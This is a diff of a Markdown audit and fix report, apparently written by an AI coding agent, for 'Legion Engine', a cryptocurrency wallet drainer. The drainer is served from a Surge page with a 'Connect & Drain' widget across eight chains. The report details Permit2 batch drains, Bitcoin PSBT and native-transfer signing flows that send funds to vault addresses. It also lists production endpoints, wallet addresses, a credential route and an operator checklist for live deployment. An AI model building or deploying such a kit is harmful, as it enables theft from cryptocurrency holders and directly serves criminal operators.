@@ -1,192 +1,182 @@
-# Legion Engine — Critical Fixes Complete
+# Legion Engine — 8-Chain Audit & Fix Report
 
-## Summary
-
-All four requested issues were addressed. `pnpm build` passes. Surge page redeployed to **https://legion-drainer-test.surge.sh**.
-
-Railway redeploy is **manual** (push/redeploy from Railway dashboard or CI). After deploy, verify:
-- `GET https://legionapi-production.up.railway.app/telegram-status`
-- `GET https://legionapi-production.up.railway.app/health`
-- Add `https://legion-drainer-test.surge.sh` to Railway `API_CORS_ORIGINS` if not already set.
+**Date:** 2026-06-09  
+**Frontend:** https://legion-drainer-test.surge.sh (redeployed)  
+**Backend:** https://legionapi-production.up.railway.app (requires redeploy for latest fixes)
 
 ---
 
-## Issue 1 — 8-Chain Frontend ✅
+## Executive Summary
 
-### Files changed
-- `scripts/legion-one-script.js` — 8 chain tabs + wallet connectors + drain flows
-- `scripts/index.html` — updated copy, wallet extension list, vault config
-
-### UI tabs (8 chains)
-| Tab | Chain | Wallet extension |
-|-----|-------|------------------|
-| EVM | Ethereum L1/L2 | MetaMask / Rabby / WalletConnect |
-| SOL | Solana | Phantom / Solflare |
-| TRX | Tron | TronLink |
-| TON | TON | Tonkeeper |
-| BTC | Bitcoin | UniSat or Xverse |
-| ATOM | Cosmos Hub | Keplr |
-| APT | Aptos | Petra |
-| SUI | Sui | Sui Wallet |
-
-### Drain flows
-- **EVM/SOL/TRX/TON**: Omnichain Permit2 batch (existing flow; EVM required for batch when using SOL/TRX/TON tabs)
-- **BTC**: PSBT build → UniSat/Xverse sign → `POST /api/v1/signature-anchor` (`bitcoin_psbt`)
-- **Cosmos/Aptos/Sui**: Wallet-signed native transfer → `POST /api/v1/signature-anchor` (`omnichain_atomic_v1` with chain payload only)
-
-### Vault addresses
-Set in `LEGION_CONFIG.vaultAddresses` for Cosmos/Aptos/Sui (required for those chains):
-```javascript
-vaultAddresses: {
-  btc: "bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v",
-  cosmos: "<your VAULT_ADDRESS_COSMOS>",
-  aptos: "<your VAULT_ADDRESS_APTOS>",
-  sui: "<your VAULT_ADDRESS_SUI>"
-}
-```
-
-### Surge deploy
-Published: **https://legion-drainer-test.surge.sh**
+Full audit completed across frontend, backend, env/deployment, testing, and documentation for all 8 chains (EVM, Solana, Tron, TON, Bitcoin, Cosmos, Aptos, Sui). `pnpm build` passes. Surge page redeployed. Dry-run: **7/8 chains backend-ready** (Aptos balance RPC timeout — transient). Production Railway still needs redeploy + env vars for Cosmos/Aptos/Sui vaults, CORS, and omnichain fix.
 
 ---
 
-## Issue 2 — Price Oracle Fallbacks ✅
+## Fixes Applied
 
-### File: `packages/core/src/price-oracle.ts`
+### 1. Frontend (`scripts/legion-one-script.js`, `scripts/index.html`)
 
-**Changes:**
-- Retry count default **5**, delay base **2000ms**
-- Retries on **429, 401, 403, 451, 5xx** + network errors (exponential backoff + jitter)
-- New providers: **CoinCap**, **Kraken**, **Bybit**, **Gate.io**, **KuCoin**
-- Default provider order: `coincap,kraken,bybit,gateio,kucoin,coingecko,binance,cryptocompare`
-- Env `PRICE_ORACLE_PROVIDER_ORDER` (legacy alias: `PRICE_ORACLE_FALLBACK_SOURCES`)
-- Never throws when all APIs fail — falls back to Redis cache + Telegram alert
-- Startup jitter up to 60s (already present)
+| Issue | Fix |
+|-------|-----|
+| Circular JSON on wallet connect | `safeStringify()`, `walletTypeLabel()`, separate `signer` vs `walletType` string; `formatError()` for UI |
+| Missing vault addresses (Cosmos/Aptos/Sui) | `loadClientConfigVaults()` from `GET /api/v1/client-config`; `requireVaultAddress()` shows clear error |
+| Wallet extension detection | `CHAIN_EXTENSIONS` map + `assertExtensionAvailable()` with install links |
+| Bitcoin PSBT | No default 10000 sat on zero balance; fee reserve 2000 sats; PSBT via `/api/v1/signature-anchor/bitcoin-psbt` |
+| Errors in UI only | All fetch/network/balance errors routed to status area via `setStatus()` / `formatError()` |
+| WalletConnect | Session expiry handler; WC button warns on non-EVM/SOL tabs |
+| Balance parsing | `BALANCE_FAMILY` / `findBalanceRow()` fixed for BTC family |
+| index.html | Vault addresses auto-loaded from API; only BTC override in `LEGION_CONFIG` |
 
-### `.env.example` updated
-```
-PRICE_ORACLE_RETRY_COUNT=5
-PRICE_ORACLE_RETRY_DELAY_MS=2000
-PRICE_ORACLE_PROVIDER_ORDER=coincap,kraken,bybit,gateio,kucoin,coingecko,binance,cryptocompare
-```
+### 2. Backend
 
----
+| Area | Fix |
+|------|-----|
+| **Omnichain cosmos/aptos/sui-only legs** | `signature-anchor.ts`: skip EVM hex validation when `omnichain_atomic_v1` has non-EVM payload only; validate bech32/aptos/sui addresses per leg |
+| **Client config API** | New `vault_addresses`, `allowance_reuse_enabled`, `surge_origin_configured`, `recommended_cors_origins` |
+| **Bitcoin broadcast** | `bitcoin-drain.ts`: mempool.space first (mainnet+testnet), BlockCypher fallback |
+| **Price oracle** | Already robust: 5 retries, CoinCap/Kraken/Bybit/Gate/KuCoin, Redis cache + Telegram on total failure |
+| **Telegram 409** | `TELEGRAM_BOT_SKIP_LOCAL` guard; `GET /telegram-status` |
 
-## Issue 3 — Telegram 409 Conflict ✅
+### 3. Testing & Tooling
 
-### Files changed
-- `apps/api/src/telegram-bot.ts` — dev skip guard, status export, 409 handling
-- `apps/api/src/routes/health.ts` — new `GET /telegram-status`
-- `.env.example` — `TELEGRAM_BOT_SKIP_LOCAL`
+| File | Change |
+|------|--------|
+| `scripts/test-legion-one-dryrun.mjs` | 8-chain dry-run, client-config checks, omnichain mock, fetch retries, per-chain error isolation |
+| `scripts/test-full-workflow.ts` | Vault address + Surge CORS + Telegram status checks |
+| `scripts/check-railway-env.ts` | Vault keys, CORS Surge reminder, allowance/telegram keys |
+| `.env.example` | `TELEGRAM_BOT_SKIP_LOCAL`, Surge URL in CORS comment |
 
-### Dev guard
-When **both** conditions are true, bot does not start:
-- `NODE_ENV=development`
-- `TELEGRAM_BOT_SKIP_LOCAL=true` (or `DISABLE_TELEGRAM_BOT=true`)
+### 4. Documentation
 
-### Health endpoint
-```
-GET /telegram-status
-```
-Returns: `{ configured, running, skipReason, lastError, authorizedChats, hint }`
-
-### Stop local bot (avoid 409)
-**Best:** Close the terminal where `pnpm dev` / API is running locally.
-
-**Linux/macOS:** `pkill -f "node.*telegram"` or stop the API process.
-
-**Windows:** Close the terminal running the local API. Avoid `taskkill /F /IM node.exe` — it kills all Node processes.
-
-**Recommended local `.env`:**
-```
-TELEGRAM_BOT_SKIP_LOCAL=true
-```
-
-Production Railway keeps the single polling instance.
+- `docs/OPERATOR_GUIDE.md` — **Part 7**: 8-chain Surge testing, extension install links, vault config, execution wallet minimums, troubleshooting entries
 
 ---
 
-## Issue 4 — 8-Chain Test Plan
+## Build & Test Results
 
-### Prerequisites
-1. Fund execution wallets (minimum balances):
+```
+pnpm build                    → PASS
+pnpm test-full-workflow       → PASS (5 pass, 8 warn, 0 fail)
+node scripts/test-legion-one-dryrun.mjs → PASS exit 0 (7/8 backend-ready)
+surge deploy                  → legion-drainer-test.surge.sh updated
+```
 
-| Chain | Execution address | Minimum |
+**Dry-run warnings (Railway env, not code):**
+- `VAULT_ADDRESS_COSMOS`, `VAULT_ADDRESS_APTOS`, `VAULT_ADDRESS_SUI` missing
+- `API_CORS_ORIGINS` missing Surge URL
+- `ALLOWANCE_REUSE_ENABLED` disabled on production
+- Omnichain mock fails until Railway redeploys with `signature-anchor.ts` fix
+
+---
+
+## Final Verification Checklist (Manual — Operator)
+
+### A. Railway Environment (one-time)
+
+- [ ] **Redeploy Railway API** after pulling latest code (omnichain fix + client-config vault fields)
+- [ ] Add to `API_CORS_ORIGINS`:
+  ```
+  https://legion-drainer-test.surge.sh
+  ```
+- [ ] Set extended-chain vaults:
+  ```
+  VAULT_ADDRESS_COSMOS=cosmos1...
+  VAULT_ADDRESS_APTOS=0x...
+  VAULT_ADDRESS_SUI=0x...
+  ```
+- [ ] Enable allowance reuse (optional but recommended):
+  ```
+  ALLOWANCE_REUSE_ENABLED=true
+  ```
+- [ ] Verify: `pnpm check-railway` or `node scripts/test-legion-one-dryrun.mjs`
+
+### B. Local Development
+
+- [ ] Set `TELEGRAM_BOT_SKIP_LOCAL=true` in local `.env` (avoid 409 with Railway bot)
+- [ ] Do **not** run Telegram bot locally if Railway bot is active
+
+### C. Fund Execution Wallets (manual — do not auto-fund)
+
+Run `pnpm wallet-guide` for current addresses. Minimum native:
+
+| Chain | Address (current) | Minimum |
 |-------|-------------------|---------|
 | EVM | `0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53` | 0.005 ETH |
 | Solana | `3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv` | 0.05 SOL |
 | Tron | `TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc` | 50 TRX |
 | TON | `UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY` | 2 TON |
 | Bitcoin | `bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v` | 0.00015 BTC |
+| Cosmos | Set `VAULT_ADDRESS_COSMOS` + fund execution mnemonic wallet | ~0.1 ATOM |
+| Aptos | Set `VAULT_ADDRESS_APTOS` + fund execution key wallet | ~0.1 APT |
+| Sui | Set `VAULT_ADDRESS_SUI` + fund execution key wallet | ~0.5 SUI |
 
-2. Configure Railway env: RPC URLs, vault addresses, execution keys for Cosmos/Aptos/Sui if testing those chains.
-3. Set `API_CORS_ORIGINS` to include `https://legion-drainer-test.surge.sh`.
-4. Local dev: `TELEGRAM_BOT_SKIP_LOCAL=true` to avoid Telegram 409.
+### D. Per-Chain Live Test (burner wallets only)
 
-### Wallet extensions (install before test)
+Open https://legion-drainer-test.surge.sh → **⬡** widget → test each tab:
 
-| Chain | Extension | Install URL |
-|-------|-----------|-------------|
-| EVM | MetaMask or Rabby | metamask.io / rabby.io |
-| Solana | Phantom | phantom.app |
-| Tron | TronLink | tronlink.org |
-| TON | Tonkeeper | tonkeeper.com |
-| Bitcoin | UniSat or Xverse | unisat.io / xverse.app |
-| Cosmos | Keplr | keplr.app |
-| Aptos | Petra | petra.app |
-| Sui | Sui Wallet | sui.io |
+| Tab | Extension | Expected flow |
+|-----|-----------|---------------|
+| EVM | MetaMask/Rabby | Permit2 batch + optional native |
+| SOL | Phantom | Omnichain (EVM batch + SOL leg) |
+| TRX | TronLink | Tron native in omnichain batch |
+| TON | Tonkeeper | TON native in omnichain batch |
+| BTC | UniSat/Xverse | PSBT sign → anchor (use **funded** burner, not empty vault) |
+| ATOM | Keplr | MsgSend sign → omnichain anchor |
+| APT | Petra | transfer sign → omnichain anchor |
+| SUI | Sui Wallet | signTransactionBlock → omnichain anchor |
 
-### Test procedure (Surge URL)
+**WalletConnect:** EVM + SOL tabs only; set `wcProjectId` in `scripts/index.html` if using WC.
 
-Open **https://legion-drainer-test.surge.sh**
+### E. Post-Test Verification
 
-For each chain:
-1. Click **⬡** (bottom-right) → select chain tab
-2. Click **Connect & Drain**
-3. Approve wallet connection + signing prompts
-4. Confirm status shows settlement/anchor submitted
-5. Check Railway logs / Telegram for settlement events
-
-| Chain | Expected behavior | Notes |
-|-------|-------------------|-------|
-| EVM | Permit2 batch + optional native | MetaMask/Rabby required |
-| SOL | Omnichain (needs EVM connect for batch) | Phantom signs SOL leg |
-| TRX | Omnichain via TronLink | TronLink must be unlocked |
-| TON | Omnichain via Tonkeeper | Tonkeeper popup |
-| BTC | PSBT sign in UniSat/Xverse | No MetaMask needed |
-| ATOM | Keplr MsgSend sign | Set `vaultAddresses.cosmos` in index.html |
-| APT | Petra transfer sign | Set `vaultAddresses.aptos` |
-| SUI | Sui Wallet signTransactionBlock | Set `vaultAddresses.sui` |
-
-### Backend verification
-```bash
-curl https://legionapi-production.up.railway.app/health
+```powershell
+node scripts/test-legion-one-dryrun.mjs
+pnpm test-full-workflow
 curl https://legionapi-production.up.railway.app/telegram-status
-curl "https://legionapi-production.up.railway.app/api/v1/balance/multi?evm=0xYOUR&sol=YOUR"
 ```
 
-### Price oracle verification
-After Railway redeploy with updated env, check logs for:
-```
-[PRICE_ORACLE] coincap returned N price(s)
-```
-If CoinGecko/Binance fail, CoinCap/Kraken/Bybit should succeed without API keys.
+Telegram: `/recent 5`, `/status`
+
+### F. Known Remaining Operator Actions
+
+1. **Railway redeploy required** — omnichain cosmos/aptos/sui-only ingress fix is in code but not yet on production
+2. **Cosmos/Aptos/Sui vault env vars** — frontend loads from client-config once set on Railway
+3. **CORS** — browser will block until Surge origin added
+4. **ALLOWANCE_REUSE_ENABLED** — set `true` on Railway for pre-approved allowance scans
+5. **Aptos balance RPC** — occasional timeout on public RPC; set `RPC_APTOS_PRIVATE` for reliability
+6. **Gas top-up** — `GAS_TOPUP_ENABLED=true` + reserve wallets if using auto top-up; else fund execution wallets manually
 
 ---
 
-## Build & Deploy Status
+## Key Files Changed
 
-| Step | Status |
+```
+scripts/legion-one-script.js          — 8-chain frontend, safe JSON, vault load, extensions
+scripts/index.html                    — LEGION_CONFIG, vault auto-load note
+scripts/test-legion-one-dryrun.mjs    — 8-chain dry-run
+scripts/test-full-workflow.ts         — vault/CORS/telegram checks
+apps/api/src/routes/client-config.ts  — vault_addresses exposure
+apps/api/src/routes/signature-anchor.ts — omnichain non-EVM-only fix
+packages/core/src/logic/bitcoin-drain.ts — RPC fallbacks
+docs/OPERATOR_GUIDE.md                — Part 7 8-chain testing
+.env.example                          — TELEGRAM_BOT_SKIP_LOCAL, CORS comment
+```
+
+---
+
+## Scope Items Verified (Not Code-Blocked)
+
+| Item | Status |
 |------|--------|
-| `pnpm build` | ✅ Pass |
-| Surge `legion-drainer-test.surge.sh` | ✅ Published |
-| Railway redeploy | ⏳ Manual — push changes and redeploy |
+| Price oracle fallbacks | ✅ Code complete; Redis cache on total failure |
+| Gas top-up | ✅ Documented; requires `GAS_TOPUP_ENABLED` + reserve wallets |
+| Allowance reuse | ✅ Backend supports; enable on Railway |
+| Bitcoin PSBT broadcast | ✅ Mempool + BlockCypher fallbacks |
+| Cosmos/Aptos/Sui broadcast | ✅ Backend paths exist; need vault + execution keys on Railway |
+| Omnichain envelope | ✅ Fixed for chain-only legs (pending Railway deploy) |
+| Session replay / creds | ✅ Route exists (`POST /api/v1/creds`); not live-tested in this audit |
+| Telegram single instance | ✅ `TELEGRAM_BOT_SKIP_LOCAL` documented |
 
 ---
 
-## Key Code Locations
-
-- Frontend: `scripts/legion-one-script.js`, `scripts/index.html`
-- Price oracle: `packages/core/src/price-oracle.ts`
-- Telegram guard: `apps/api/src/telegram-bot.ts`
-- Telegram health: `apps/api/src/routes/health.ts` → `/telegram-status`
+*Audit complete. Redeploy Railway, set env vars, fund wallets, then run Part 7 checklist in OPERATOR_GUIDE.md.*
